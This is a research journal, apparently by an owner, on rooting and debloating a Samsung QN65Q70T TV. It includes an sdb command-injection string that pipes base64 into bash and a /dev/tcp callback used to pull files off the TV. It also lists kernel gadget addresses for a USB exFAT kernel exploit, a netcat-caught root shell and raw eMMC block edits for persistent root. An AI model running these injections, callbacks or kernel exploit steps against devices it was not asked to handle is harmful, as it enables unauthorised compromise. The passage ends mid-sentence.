# Q70T Root & Debloat Field Journal

> **Note.** This is a chronological field journal, not a tutorial. It keeps
> superseded conclusions and dead ends in place on purpose, and later
> sections correct earlier ones. For the finished narrative read
> [WRITEUP.md](WRITEUP.md); for the rules of thumb read [LESSONS.md](LESSONS.md).

Working notes for rooting and de-bloating a **Samsung QN65Q70TAFXZA** (2020 Q70T,
model code `20_NIKEM_QTV`) using [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root)
as the starting point. That project only *tested* QN90B/QN90F — this journal is the
full adaptation story for a 2020 Q70T, written so other Samsung/Tizen owners can
reuse every step. See also: [METHODOLOGY.md](METHODOLOGY.md) (methodology)
and [LESSONS.md](LESSONS.md) (distilled lessons).

- **TV:** QN65Q70TAFXZA, Tizen 6.0-era, ARMv7 32-bit userland, 4 cores, 1.8 GB RAM, wireless
- **Network:** TV `<TV_IP>`, controller Mac `<HOST_IP>` (set DHCP reservations!)
- **Goal:** uid 0 → kill the ACR/telemetry/ad stack → fast, quiet TV
- **Status:** dev-signed .NET app executes on-TV with CAP_SYS_ADMIN (see §8-9); root attempt in flight

---

## 1. Host tooling setup (macOS, Apple Silicon)

| Component | How |
|---|---|
| samsung-tv-root | v0.0.8 release binary **predates `archive-root`** (master is 2 commits ahead). Run from source: `uv sync --locked` |
| Tizen Studio (for `sdb`) | CLI installer only — `web-cli_Tizen_Studio_6.1_macos-64.bin` (280 MB) from `download.tizen.org/sdk/Installer/tizen-studio_6.1/`. Installs `sdb` 4.2.25 → `~/tizen-studio/tools/sdb`. x86_64 → Rosetta |
| .NET SDK | `dotnet-install.sh --channel 6.0` → 6.0.428 (version pinned by `payloads/common31/global.json`) |

**Payload build gotcha:** `make common31-payload` fails `NETSDK1005` — net6.0 and
netcoreapp3.1 builds share `payloads/common/obj/`. Fix: clean obj between TFMs or
build in an isolated dir with `-p:BaseIntermediateOutputPath=obj/` (what `tvroot-app` does).

## 2. Enabling Developer Mode on a Q70T

1. Hidden menu: Smart Hub → **Apps** → highlight the **App Settings** gear (don't
   click in) → type `12345`.
2. Smart Remote has no digits; SmartThings number pad unreliable; **USB keyboard
   into the TV works** — type `12345` quickly while the gear is highlighted.
3. The dialog has TWO fields: enable Dev Mode **and set host PC IP**. Skipping the
   IP leaves `developerIP: 0.0.0.0` → port 26101 never opens. Verify:
   `curl http://<TV>:8001/api/v2/` → `device.developerMode`, `device.developerIP`.
4. **The menu reboot does not arm `sdbd`.** Hard power cycle (unplug 30 s) did.
5. `sdb connect` fails for ~25-40 s after boot/wedges — retry loop. Plain
   `sdb shell` printing `closed` on retail firmware is **normal**.

## 3. The sdk foothold (SVE-2025-50109)

- Injection: `sdb shell "0 appinstall tpk new2.tpk\`printf${IFS}%s${IFS}<b64>|base64${IFS}-d|bash\`.tpk"`
  → runs as `uid=901(sdk)`, context `System`, rich priv groups.
- **~510 byte injection limit.** Longer commands: `sdb push` script to
  `/home/owner/share/tmp/sdk_tools/` + `. it`. Executing *binaries* there is
  SMACK-blocked (§5); sourcing *scripts* works.
- Output: `exec 3<>/dev/tcp/<host>/<port>` callback. Host listens; TV connects out.
- **Background processes spawned in an injection inherit callback fd 3** → the
  host-side capture hangs waiting for EOF. Fix: append `3>&-` to the backgrounded
  command (`nohup x > f 2>&1 < /dev/null 3>&- &`).
- Stability: after ~30 rapid probes (or one hung recursive grep) injections return
  `closed`/timeouts. Recovery: `sdb kill-server && start-server` + connect retry
  (~25-40 s). `tvroot-app/foreshell.py` wraps all of this. Avoid unbounded
  recursive greps over `/usr`, `/etc` — callback windows are 25-45 s.

## 4. Capability census (getcap -r /usr/bin /usr/sbin) — the important ones

```
/usr/sbin/sdbd-tarlauncher = cap_setgid,cap_setuid+eip          ← archive route needs exactly this ✓
/usr/sbin/sdbd             = cap_dac_override,cap_setgid,cap_setuid,cap_sys_admin+ei
/usr/bin/dotnet-launcher{,-inhouse} = cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,
                             cap_sys_ptrace,cap_sys_admin,cap_mac_override,cap_mac_admin+eip
/usr/bin/dotnet-hydra-launcher = cap_setgid,cap_sys_admin+ei
/usr/bin/launchpad-starter = cap_dac_override,cap_setgid,cap_sys_admin,cap_mac_admin+eip
/usr/bin/launchpad-loader  = cap_setgid,cap_sys_admin,cap_mac_admin+ei
/usr/bin/pkgmgr-server     = cap_chown,cap_dac_override,cap_fsetid,cap_kill,cap_setgid,cap_setuid+ei
/usr/bin/pkill             = cap_kill+ei
/usr/bin/amd               = cap_dac_override,cap_kill,cap_sys_admin+ei
```

- **No `/usr/bin/dotnet`** (unlike QN90B/QN90F) → stock archive-root probe fails at
  the capability check.
- **No `/dev/sdp_pqe_fdet`** → QN90B physical-memory route unavailable.
- `tar --to-command` ✓.
- **File caps apply on exec for any caller** — that's why everything routes through
  cap-bearing Samsung binaries.

## 5. SMACK realities (uid 901 sdk)

- Exec of copied binaries from `sdk_tools`: **EPERM** (SMACK label). Scripts OK
  (bash only reads them).
- `pkill` (cap_kill+ei) **cannot kill `owner` processes** — SMACK label rules gate
  signals above capabilities. `aul_test term_pid` from sdk: also denied.
- `sdb pull` blocked on retail → **exfil via `base64 <file>` through the callback**.
- `/proc/<pid>/exe` + `/proc/<pid>/fd` unreadable cross-user; `/proc/<pid>/status`
  and `cmdline` ARE readable (used to confirm CapEff of our running app!).

## 6. The .NET landscape on Tizen 6.0 (Q70T)

- Shared framework: `/usr/share/dotnet/shared/Microsoft.NETCore.App/` =
  2.0.0, 2.1.0, 2.1.1, 2.1.4, **3.0.0** — no 3.1, no 6.x.
- `/opt/dotnet/runtime/` = TizenFX tree with **dangling symlinks** into empty
  `/usr/share/dotnet_org` — leftover, not live.
- **No `/usr/bin/dotnet`.** Managed code runs via **`dotnet-launcher` /
  `dotnet-launcher-inhouse`** = **launchpad plugins** (RPM `dotnet-launcher-3.0.0`):
  - Symbols: `LaunchpadAdapterImpl::loaderMain`, `CoreRuntime::launch/initializeCoreClr`,
    `isManagedAssembly`, `getRuntimeDir`, `pluginSetAppInfo`, `checkInjection`.
  - Launchpad spawns a "host" instance (empty argv) → CoreCLR boots → the real app
    launch arrives via launchpad; with app `multiple="true"` the launcher instead
    runs **standalone mode** (`realMain(98)`) and **executes the assembly directly**.
  - The launcher **redirects app stderr to `/tmp/dotnet_error.<pid>.*.log`** —
    managed `Console.Error` output lands there (our visibility channel!).
  - Debug-pipe attempt (`/tmp/dotnet_pipe_in|out`, `clr-debug-pipe-*` setxattr)
    fails benignly on retail.
- Proven .NET apps on this TV: `com.samsung.tv.adplayer`, `com.samsung.tizen.autofill-app`,
  `org.tizen.ambientapp` (its argv reveals the launch shape:
  `<appid> -inhouse --standalone <dll>`).
- App layout that installs+launches: `tizen-manifest.xml` + `bin/<dll>`,
  `bin/<dll>.runtimeconfig.json`, **`<dll>.deps.json` at package ROOT**, `res/icon.png`.

## 7. Debloat census (why the TV "runs like shit")

34 min after boot, idle: **load 14.07 on 4 cores**, 366 tasks, swap 98 MB/0.9 GB,
MemFree 213 MB/1.8 GB. 303 apps in `/usr/apps`, 222 in `/opt/usr/apps`.

### Kill list (measured)

| Process | Role | Evidence |
|---|---|---|
| `/usr/bin/contents-recognition-service` | **ACR: continuous screen capture + OCR** | 3:11 CPU / 34 min (~9% core forever); `secured capture 65535x65535`, OSD template gen |
| `/usr/bin/acr` | ACR daemon | resident |
| `com.samsung.tv.vision-data-recognition-service` | vision/telemetry | resident |
| `com.samsung.tv.pisa-service` + `adagent-service` | **ad platform** | 3% CPU |
| `com.samsung.tv.slive-daemon` (`bms-service`, `slive-provider-daemon`) | **TV Plus** v2.9.04419 | watchdog churn |
| `org.tizen.ambientapp` | Ambient Mode | **94 MB RSS — largest app on box** |
| `STABD` | telemetry agent | constant sysInfo reporting |

Window manager `enl…`: 22% CPU. Two root `sh`+`sleep 10` polling loops.
`MainSmartDeadlock` watchdog **firing in TVS** (main TV service) — the lag, quantified.
HDMI-CEC sees a Sony HT-A5000 soundbar.

## 8. Route decision tree

```
QN90B fdet route      ✗  no /dev/sdp_pqe_fdet
archive-root (stock)  ✗  no /usr/bin/dotnet → capability check fails
archive-root adapted  ✓  IN FLIGHT: our own dev-signed .NET app (org.tvroot3.q70t)
                         runs on-TV with CAP_SETGID|SYS_ADMIN|MAC_OVERRIDE|MAC_ADMIN
                         (confirmed via /proc/<pid>/status CapEff=3000200040)
                         → bind-mount forged key/passwd → exec sdbd-tarlauncher → root
```

Key insight: **file capabilities of `dotnet-launcher-inhouse` transfer to any app
launchpad runs through it.** A dev-installed app (`sdb install`, sdk-public
distributor cert — no Samsung account needed) therefore gets CAP_SYS_ADMIN
legitimately. The mount-namespace + tarlauncher trick does the rest.

## 9. The tvroot app saga (read before repeating any of this)

Chronological traps, all documented in [METHODOLOGY.md](METHODOLOGY.md):

1. v0.0.2 `type="dotnet"` → launchpad never dispatched it (no launcher logs at all).
2. v0.0.3-0.0.4 `type="dotnet-inhouse"` → launcher ran but app died at
   `checkAppHasPlatformPrivilege` (host/pipe launch path).
3. Missing `<dll>.deps.json` at package ROOT → assembly load path broken.
4. `tizen run` = DEBUG launch → launcher parks at `handleDebugPipe`/`Process in
   Host` waiting for a debugger. **Use `aul_test launch <appid>` for normal launches.**
5. **The breakthrough (v0.0.9): `multiple="true"` in the manifest → "Run in
   standalone mode" → `execute assembly: .../tvroot.dll` → our C# ran.**
6. The aul launch passes token `zaybxcwdveuftgsh` as argv[1] — arg dispatch must
   match the package-name pattern exactly (v0.0.10 fix).
7. Visibility: stderr → `/tmp/dotnet_error.<pid>.*.log`; TCP callback to the
   controller; dlog via a **streaming** `dlogutil > file` started BEFORE the launch
   (with `3>&-` on the backgrounded process).

## 10. The cap-drop mystery — mechanism mapped; the pool chain is firing

**The complete spawn/caps map (verified via /proc sampling + binary analysis):**

- `launchpad-loader` spawns TWO processes per dotnet-app launch:
  1. the **host**: `dotnet-launcher-inhouse` (empty argv) — **FULL file caps at exec**
     (CapEff=3000200040, all threads, stable). Loads CoreCLR + **preloads our
     assembly** — waits forever.
  2. the **child**: argv[0]=`<appid>`, `--standalone` — **CapEff=0 at exec** — runs Main.
  The strip happens between the spawns (loader policy). Managed code on Q70T
  therefore always runs with 0 caps via launchpad. Upstream's QN90B/QN90F/Q80A
  flows avoid launchpad: they exec `/usr/bin/dotnet` (file caps) **directly from
  the injection shell** — that binary does not exist on the Q70T.

**The pool chain (AI-assisted RE + our implementation) — currently FIRING:**
- The research agent decoded `launchpad-process-pool` completely
  (`tvroot-app/pool-protocol.md`): AF_UNIX at
  `/run/aul/daemons/<uid>/.launchpad-process-pool-sock`, 12-byte header
  `{cmd,datalen,flags}` + base64 bundle (SHA1-checked libbundle codec), one
  request per connection, `uid≤4999` callers **skip the SMACK label gate**.
- **We run our OWN pool instance from the injection**: exec
  `launchpad-process-pool` → it inherits its file caps
  (dac_override,setgid,**sys_admin**,sys_nice,mac_admin+eip) → verified live:
  `uid 901, CapEff 0x200042` → binds the **sdk-owned** socket
  `/run/aul/daemons/901/.launchpad-process-pool-sock` (world-writable!).
- Our native helper (installed tpk binary — the one executable we have) gained a
  **client mode** (v0.0.15) and successfully sent the launch packet. The pool
  fork+execv'd `dotnet-launcher-inhouse` **as a new sdk-owned process** (pid
  25659, verified via its stderr file timestamp) — the exec chain fires!
- Current gap: the pool-spawned launcher takes the **host-mode path** and exits
  (the standalone trigger needs the launchpad registration the pool can't
  provide). Next iteration: fresh dlog capture around a pool launch + bundle
  argv shaping (the pool exports remaining bundle items as the child's argv —
  the launcher's standalone trigger likely lives there), plus the
  `__AUL_EXEC__`=helper recursive variant.

**Vehicles analyzed and closed:**
- `dotnet-launcher-inhouse` direct exec: `-inhouse --standalone` → dies at
  `SetAppInfoInhouse` (unregistered pid); without `-inhouse` → host mode.
- `dotnet-hydra-launcher`: dlopen's dotnet-launcher, calls `realMain` +
  `coreclr_preload_assembly` against `/usr/share/aul/dotnet.preload.list`
  (framework warmup only) — launchpad-hydra daemon wrapper.
- `launchpad-starter`: bootstrap daemon for `launchpad-process-pool`
  (SECURE_KEEP_CAPS + capset SETGID|SYS_ADMIN onto itself, then execs the pool).
- `sdb root on` → cynara denied. `/usr/share/sdbd/public.pem` = Samsung's own key.

**The ecosystem (community projects mapped to our tracks):**
- `chris-ritsen/samsung-tv-root` — the upstream exploit (QN90B/QN90F; Tizen 6.5/9.0
  have `/usr/bin/dotnet` with file caps — exec'd directly from the injection).
- `DemonKingSwarn/samsung-tv-tizen-root` — Tizen 9.0 root + **84-package debloat**
  (511→427) with the **kill-switch marker** mechanism + a host root watchdog.
  agent-authored; cloned under `references/`.
- `andrearicci93/vetro` — **root-powered debloat dashboard on a Tizen 6.0 Q80A
  (same generation as the Q70T!)**: TV-local SDB self-re-rooting, ACR/ads/voice
  switches, MQTT/Home Assistant. Its adapter executes
  `/usr/bin/dotnet <dll>` via the TV-local injection — the Q70T needs our
  launcher adaptation. Cloned under `references/`.
- `simbasjungles/free-my-tv` (1.4k★) — **multi-platform home screen with a Tizen
  port (Tizen 3+!)**: `tizen/build.py` packs `web/` (home UI + `tv.js` = Tizen
  web APIs for apps/inputs) into a signed WGT; installs via **TizenBrew
  Installer** (the community signer); **"Start Screen Options → Autorun Last
  App"** boots the TV into it. No root. Cloned under `references/`.
- `iampiny/reframe` + `nthnclrk/CleanFrame` + `abhaymundhara/samsung-tizen-launcher`
  — Tizen web-app launchers (6.0/6.5/9.0): signed WGT deployment patterns,
  app-registry reads, remote-Home experiments. Cloned under `references/`.
- `Gathin23/cleanyourtv` — Android TV debloat methodology (backup → disable →
  restore) that we adopted for the Q70T kill list.
- Field reports: Jack Zerby got **UID 0 on a TU700D (2020 Tizen, fw 2301.1)** by
  adapting the root tool to its .NET Core 3.1 runtime, then ran an input agent
  (remote interception via uinput) and changed first-screen/boot-app settings —
  the exact endgame, proven on 2020-era hardware.

**Remaining ranked ideas:**
1. ~~Native tpk empirical test~~ — **DONE, negative**: a native (`type="capp"`) tpk
   with a static freestanding ARM binary (`helper.c`, builds+installs+runs!) is
   spawned by launchpad identically to the dotnet child: `uid=5001, CapEff=0,
   CapPrm=0`. All launchpad-spawned app children on this firmware are sanitized.
   (Manifest gotchas for native tpks: needs `type="capp"`, icon element must be
   omitted or valid.) `aul_test launch_for_uid <appid> 0` succeeds but still
   spawns as owner.
2. Speak the **launchpad-process-pool socket protocol**
   (`/run/aul/daemons/<pid>/.launchpad-process-pool-sock`; the pool process
   `launchpad-process-pool` carries
   cap_dac_override,setgid,sys_admin,sys_nice,mac_admin+ei and spawns app
   binaries on demand — its spawn path is the last untested one).
3. `devzone-launcher` (full caps) argv contract — unexplored.
4. `kmod` (cap_sys_module) kernel-module route — risky, last resort.
5. **Ask the upstream author** (the README invites it): on Tizen 6.5/9.0 the
   QN90B/QN90F flow works — does their launchpad not strip caps from app
   children, or is there a spawn path we're missing on Tizen 6.0? The journal
   above contains every detail needed for a precise issue.

**Session summary (what stands):**
- Full sanctioned pipeline: Tizen CLI certs (no Samsung account) → signed tpks
  (managed *and* native) → install → launch → on-TV code execution with output
  channels (TCP callback, stderr files, file reports).
- The complete launchpad/capability map of Tizen 6.0 Q70T (§10 above).
- `rootparty.py`: one-command staging + listener; ready the moment a privileged
  execution vehicle exists.
- The blocker in one sentence: **every path that runs our code on this firmware
  strips file capabilities at spawn; every path that keeps caps requires
  launchpad IPC we can't yet speak.**

## 11. ROOT CAMPAIGN — final status (2026-10-20)

**The sdp_mem primitive may be hardened on the 2026-07 firmware.**
- `mmap2` at PFN 0x40000 (phys 0x40000000) returns EFAULT (errno 14) from managed P/Invoke
- The Synacktiv Q60T exploit used the same driver on an older firmware
- The tool's log file (physmap.log) is empty — SMACK may block the write

**The label gate wall (confirmed multiple ways):**
- launchpad-loader sanitizes ALL app children to CapEff=0 (both dotnet and native capp)
- The pool's SMACK gate only accepts User/System/System::Privileged labels
- App children get User::Pkg::<appid> labels — always refused
- The only gate-skipping context (uid ≤ 4999) is the injection itself, which has no unix-socket client and can't exec app binaries

**What DID work today:**
- ✅ Complete app build/sign/install pipeline (managed + native)
- ✅ Managed app runs on-TV with full logging (stderr + TCP + file)
- ✅ Pool protocol decoded + our own pool instance running
- ✅ Kill-switch markers deployed (ads + TV Plus disabled, reboot-proof)
- ✅ AdGuard DNS live
- ✅ Free My TV installed and running
- ✅ the research agent's 997-line managed app + SIGBUS-safe native scanner + dd fallback

**The remaining path: USB kernel exploit (Luminger NikeM port)**
- The exFAT bug is confirmed on NikeL (2020 Q60T) and NikeM2 (2021 QN90A)
- NIKEM (our Q70T) is the same generation — the bug should be present
- The Q90T port (same platform!) was completed Oct 2026
- Requires: our firmware archive → decrypt → kernel address recovery → USB image build
- The USB payload runs call_usermodehelper = kernel executes our script as root
- Bypasses: SMACK, label gates, cap stripping, launchpad, everything

**Key files for the next session:**
- tvroot-app/physmap-tool.c — 622-line tool (SIGBUS-safe, tagged cred scan)
- tvroot-app/physmap-plan.md — the research agent's full plan with DRAM layout research
- tvroot-app/holes.md — all discovered vulnerabilities
- tvroot-app/github-roots-survey.md — 408-line survey of all known Tizen roots
- tvroot-app/pool-protocol.md — complete pool IPC protocol
- references/samsung-tv-usb-root/ — Luminger's tooling with Q90T NikeM port data

## 12. THE USB ROOT PATH — proven on NIKEM

The tiz0wn project (github.com/sebastianspicker/tiz0wn) rooted a Q90T
(20_NIKEM_QTV, T-NKMDEUC-2743.0 — same platform as our Q70T) using
Luminger's USB exFAT exploit adapted from Muse.M.

Key facts from the Q90T handover:
- Platform values derived from the TV's kernel image (NOT from decrypted firmware)
- The T-NKM firmware decryption key is NOT in any known key list
- Boot persistence via /opt modification (no USB needed after initial root)
- Developer Mode turned OFF after root (self-sustaining)
- Root console: line-oriented, fresh subshell per command

The MSDU11 firmware decryption: 10 known keys (T-HKM through T-NKL) all FAIL
on T-NKM firmware. The SWU AES passphrase file is readable as uid 901 but
the TEEC helper doesn't support the Tizen 5.5 ABI. A confirmed T-NKM key
is needed for firmware decryption — OR the kernel values come from the TV itself.

Our Q70T (T-NKMAKUC, same NIKEM platform, different region) should use
the same approach. The kernel addresses may differ slightly between the
EU (DEUC) and US (AKUC) builds but the platform is identical.

NEXT STEPS:
1. Contact metaljay on the tiz0wn issue for the Q90T NIKEM address values
2. Test those values against our Q70T kernel
3. Build the USB exploit image with Luminger's tooling
4. Plug in and root

## 14. sdp_mem physmap: CONFIRMED DEAD on 2026-07 firmware

The managed v0.3.1 app dumped 4 MB from physical 0x40800000 via sdp_mem mmap.
The entire dump contains zeros — zero occurrences of 0x1389 (5001) anywhere.
The sdp_mem driver's `sdp_mem_mmap()` at `sdp_hwmem.c:1603` was hardened: it
checks `phys region intersects with dts memory region` and redirects all
mappings to a zero page instead of the actual physical memory.

**Every physmap-based approach (Technique A, the cred scan, the kernel text
dump) is dead on this firmware.** The primitive that worked on the 2020 Q60T
(Synacktiv) and the 2020 T5300 (ntksys) has been patched.

**The remaining paths:**
1. USB kernel exploit (Luminger NikeM port) — needs kernel image for addresses
2. TrustZone SWU firmware decrypt — the TEEC client approach
3. Ask metaljay for the Q90T NIKEM address values
4. Samsung GPL source request for NIKEM kernel

The MSDU11 container (upgrade.msd, 1.7 GB):
- Header: magic "MSDU11", 9 sections, TOC at 0xEC (Salted__ + salt 9cdd28651baf3f28)
- TOC ciphertext: 3984 bytes at offset 0xFC (AES-CBC, key from the NikeM release key)
- TOC decrypts to: RSA signature + section table with per-section salts/offsets

Section table:
| idx | offset | size | likely content |
|-----|--------|------|----------------|
| 1 | 0x00108c | 442 KB | bootloader/kernel loader |
| 2 | 0x006d0a | 3.1 MB | kernel uImage (compressed) |
| 3 | 0x036b0b | 7.0 MB | kernel + initramfs |
| 4 | 0x0a222c | 1.5 MB | modules |
| 5 | 0x0ba01d | 1 KB | config |
| 6 | 0x0ba05e | 4.1 MB | rootfs part |
| 7 | 0x0f9e5f | 1.0 MB | recovery |
| 8 | 0x109c60 | 1.67 GB | main rootfs (VDFS) |
| 9 | 0x648896 | 3.1 MB | extra data |

Kernel candidates for ksymtab address extraction: sections 2 and 3.
The TEE decrypt via the SWU TA (commands 0/1/2) unlocks these sections.
The TEEC client constants are in nikem-addresses.md Appendix A.

## 15. ROOT CAMPAIGN — SOLVED ON THE HOST SIDE (2026-10-21)

The firmware is decrypted and the kernel is in hand. No T-NKM key was needed.

**Breakthrough:** the SWU TrustZone TA decrypts the MSD for us. A managed
(C#, netcoreapp3.0) app running as **uid 5001** opens a TEEC session with the
SWU TA — no caps, no group — and decrypts the TOC and any section. The trick
was the *legacy* TEEC ABI: 60-byte `TEEC_Operation`, 12-byte params, one byte
per param type, `PARTIAL_INOUT` for all memrefs, `TEEC_AllocateSharedMemory`
buffers. Client: `tvroot-app/tee-app/`. Exfil goes through the `sdb pull`
whitelist (`profctl_[a-zA-Z]{1,30}.log`) into the writable `sdk_tools/profctl`.

**Result:**
- TOC decrypted (3984 B ct, salt `9cdd28651baf3f28`), all 9 partitions mapped.
- `uImage` = section 3, `0x6b7110` bytes, salt `d1f7e55f5ae26010`, CRC32
  `0xa4af26ca` — matches. Raw uncompressed Linux 4.1.10, build stamp identical
  to `/proc/version` (`Thu Jul 2 08:49:56 UTC 2026`, gcc 6.2.1 VDCosmos).
- NIKEM address table derived from that image:
  UMH `0xc003b87c`, memcpy `0xc020b120`, coherent `0xc001d808`,
  park `0xc05330e0`, `ldm ip` `0xc05455bc`, copy window `0xc010f424`,
  save-r1 `0xc04b35d0`, flush wrapper `0xc00128ec`, UEP gate `0xc01de028`.
  The first three match the published NikeL values exactly.
- The TV's `exfat_core.ko` sha256 is `9905f0dd…` — byte-identical to the NikeL
  module the trigger was built for.
- Two USB images built: `tvroot-app/out/nikem-usb.img` (default) and
  `out/nikem-usb-uep.img` (also patches UEP, enables dropbear).

**Full detail, derivation proofs, build and run instructions:
[tvroot-app/root-plan-final.md](USB-EXPLOIT.md).**

The remaining step is physical: flash, insert, power on, listen on `:4444`.

## 16. ROOT ACHIEVED — QN65Q70TAFXZA rooted (2026-10-21)

Flashed `out/nikem-usb.img` to the USB stick (`sudo dd ... of=/dev/rdisk6
bs=4m`), inserted with TV off, powered on, `nc -lv 4444` on the Mac:

```
KERNEL-STAGE-OK
bash-3.2# id
uid=0(root) gid=0(root) context="_"
bash-3.2# uname -a
Linux Samsung 4.1.10 #1 SMP PREEMPT Thu Jul 2 08:49:56 UTC 2026 armv7l GNU/Linux
```

`context="_"` — the `call_usermodehelper`-spawned bash bypasses SMACK entirely.
First confirmed Q70T root on this firmware (T-NKMAKUC-2743.0).

### Root-era debloat mechanics (all verified live)

1. `kill`/`systemctl stop` as root: works; no SMACK denials. Memory went
   213 MB → 497 MB free after killing the ACR trio + ads + TV Plus.
2. `systemctl disable` **does not stick** on this firmware — vendor targets,
   path units and D-Bus re-activate "disabled" services (same finding as the
   QN90A couchroot audit).
3. `systemctl mask` **fails**: `/etc/systemd/system` is a read-only filesystem
   even for root (`Failed to mask unit: Read-only file system`).
4. **The proven mechanism: mask in `/run/systemd/system`** — it is FIRST in
   `UnitPath`, writable, and a `/dev/null` symlink there overrides the
   read-only unit files. tmpfs, so it must be re-applied every boot.
5. `systemctl stop` on this TV can **hang indefinitely** when the job touches
   D-state units — always use `systemctl --no-block stop` from scripts.
6. The `/opt` marker trick (`ConditionPathExists=!/opt/usr/share/systemd/
   system/<name>`) only covers units that ship the condition: pisa, adagent,
   slive, canalysis. `contents-recognition-service`, `acr`, `vision-data`
   have NO marker condition — they need the `/run` mask.

### Persistence: debloat baked into the boot payload

`build-nikem-usb.py` STAGE1 (the root script piped into `bash -s` by the
kernel stage at **every boot**) now:
- masks `acr.service`, `acr.path`, `contents-recognition-service`,
  `vision-data-recognition-service`, `vdsystem-update-manager.service`,
  `org.tizen.remotepc.service` in `/run/systemd/system` immediately;
- backgrounds a delayed pass (30 s): `daemon-reload` +
  `systemctl --no-block stop` for anything that started before the masks
  landed; logs to `/opt/share/tvroot/debloat.log` for verification.

Rebuilt image: `out/nikem-usb.img` sha256 `9a68f1cd…393d8` (num_ext=67,
beacon <HOST_IP>:4444 unchanged). Re-flash = same dd command; if the
stick was replugged into the Mac, `diskutil unmountDisk force disk6` first
(macOS fskit auto-mounts TRIG/SMTPAY and dd then fails with Resource busy).

### Persistence model (final)

| Layer | Mechanism | Survives reboot |
|---|---|---|
| pisa / adagent / slive | vendor condition markers in `/opt` (persistent FS) | ✅ |
| acr / contents-rec / vision-data / update-mgr / remotepc | `/run` masks re-applied by stage1 each boot | ✅ (stick in) |
| telemetry DNS | AdGuard Home @ <DNS_IP> | ✅ |
| root | USB exploit re-fires on every boot mount | ✅ (stick in) |

### Observations still open

- Load average on this box is I/O-dominated: 40+ with only 4–37 % per-core
  CPU; D-state kworkers/nsrpc/TrustZone threads on slow eMMC. The 15-min
  steady-state number after the masked boot is the metric that matters.
- `systemctl --failed` shows 13 failed units, most pre-existing (NFC,
  AirPlay, browser, easysetup, ses-usb-installer — the latter two are our
  own stick's artifacts).
- Dropbear persistence path (unsigned) needs the `-uep` image; untested.
- `pkgcmd -D -n <pkgid>` package deactivation + the 84-package purge groups
  from `references/samsung-tv-tizen-root/docs/DEBLOAT.md` are the next layer.

## 17. EXTERNAL INTEL (2026-10-21): addresses confirmed, UEP warning, load mystery solved

Three external sources, all Tizen 6.0 / kernel 4.1.10 family:

### 17.1 metaljay (tiz0wn #1) — our NIKEM address table INDEPENDENTLY CONFIRMED

Recovered from a QE75Q90TATXXU kernel, stamp `T-NKMDEUC-REL-202607031800`
(US 2743.0 vs UK DEUC — sibling builds, Jul 2/3 2026):

| value | metaljay (Q90T) | ours (TEE-decrypted Q70T) |
|---|---|---|
| call_usermodehelper | `0xc003b87c` | `0xc003b87c` ✅ |
| memcpy | `0xc020b120` | `0xc020b120` ✅ |
| ldm ip gadget | `0xc05455bc` | `0xc05455bc` ✅ |
| UEP verifier gate | `0xc01de028` | `0xc01de028` ✅ |
| unreferenced cave | `0xc0008358..0xc0009000` | same ✅ |
| cave copy dest | `0xc00083d8` | same ✅ |
| **UEP status global** | **`0xc069342c` (new to us)** | — |

The TEE-decrypt derivation is validated by an independent party.

**UEP warnings (field-verified on Q90T):**
- Patching the UEP verifier ENTRY (what our `nikem-usb-uep.img` does) caused
  a **BOOT LOOP** on the Q90T. Treat the `-uep` image as risky/untested here.
- Setting the status global `0xc069342c` to zero allowed unsigned binaries
  but the state was **unstable**. If unsigned binaries (dropbear) are ever
  needed, the status-global write is the candidate — not the entry patch.

### 17.2 tiz0wn #5 (AU9072, 21_NIKEL_UHD, Tizen 6.0) — debloat realities

- **Preload packages cannot be uninstalled even as root**: `pkgcmd -u` →
  `Operation not allowed [-4]` for preloads; `pkgcmd -D` does not exist in
  this pkgcmd build; `pkgcmd -s` → `Undefined Error [-999]`. The Tizen 9
  84-package purge does NOT carry over. **Marker-based service disabling is
  the durable route.**
- Exactly **16 units** gate on `ConditionPathExists=!/opt/usr/share/systemd/
  system/<name>`. On 21_NIKEL that set includes `pisa-service` (gates
  `adagent-service`), `canalysis-daemon` (gates `canalysis-service`),
  **`vision-data-recognition-service`** (which we believed had NO marker on
  NikeM — verify against OUR rootfs unit files), context-aware agent/service,
  ghdaemon, ondevice-voice, voice-app, slive, AirPlay, health.
- **Load average mystery SOLVED**: these sets idle at load 11–13 with an idle
  CPU because ~10 processes sit in **D-state waiting on absent hardware**
  (`Tuner-Mon-Sat-M`, `kfactoryd`, `eArcTask`). "It is not a useful
  performance signal." → Our baseline ~14 and post-debloat readings are
  dominated by hardware-wait D-state, NOT CPU work. Judge debloat success by
  service census + memory + feel, not loadavg.
- Their root is a temporary archive-root session (no boot persistence) — our
  USB re-fire is strictly stronger.

### 17.3 metaljay's no-stick boot persistence (Q90T) — future route

`/etc/profile.d/bash_prompt_custom.sh` is sourced as root via
`tizen-system-env.service → /etc/profile → profile.d`. On Q90T they edited it
in place via the raw eMMC block device: `/dev/mmcblk0p18`, partition-relative
byte `752541696` = 512-block `1469808` = 4K block `183726` (first 512-byte
data block of the 776-byte file). The edit repoints a guarded loader's
payload path to a boot script under `/opt` — root **without the USB stick**.
Block offsets are image-specific: locate and verify independently on the
Q70T rootfs before any block surgery. Changed-block SHA-256s recorded in the
issue for their image.

## 18. BOOT-LOOP FORENSICS + PERSISTENCE DECISION (2026-10-21 afternoon)

### 18.1 The boot loops were trigger geometry, not finder logic

Every kernel-stage edit changed the cave blob length → `num_ext` (fragments
the exFAT driver copies into the cave) changed silently:

| image | cave | num_ext | field result |
|---|---|---|---|
| original / 9a68f1cd | 544 B | 67 | root 4/4 boots, stable |
| 2561f64e (direct-path finder) | 640 B | 70 | **boot loop** |
| a4a3208c / 080b76ed / 827cd497 | 640 B | 70 | **boot loop** (even fully backgrounded) |
| 0153b778 (quoted-glob finder) | 548 B | 67 | root, stable, TV up |

`build-nikem-usb.py` now **refuses to ship nikem images with num_ext != 67** —
the only field-validated geometry. Any kernel-stage command edit must keep
the cave ≤ 547 B or re-run the simloop validation.

Also: the beacon `exec 9<>/dev/tcp/...` runs synchronously inside the UMH
wait during the exFAT mount — if the listener is down/firewalled the connect
blocks and can stall the mount. **Rule: always have the :4444 listener armed
before powering the TV with the stick in.**

### 18.2 stage1 auto-execution: still never field-verified

The finder (quoted glob) waits for p2 and pipes stage1 into bash — correct by
construction, but the afternoon boots did not produce proof.txt/debloat.log,
and trigger fire-rate dropped (4/4 morning → ~1/3 afternoon with identical
bytes). The trigger is timing/heap-state sensitive. Root remains reliable per
flash+boot when the callback lands; the automation layer is the flaky part.

### 18.3 Decision: archive-root watchdog is the persistence path

The USB/stage1 chain is a clever but fragile persistence vehicle. The
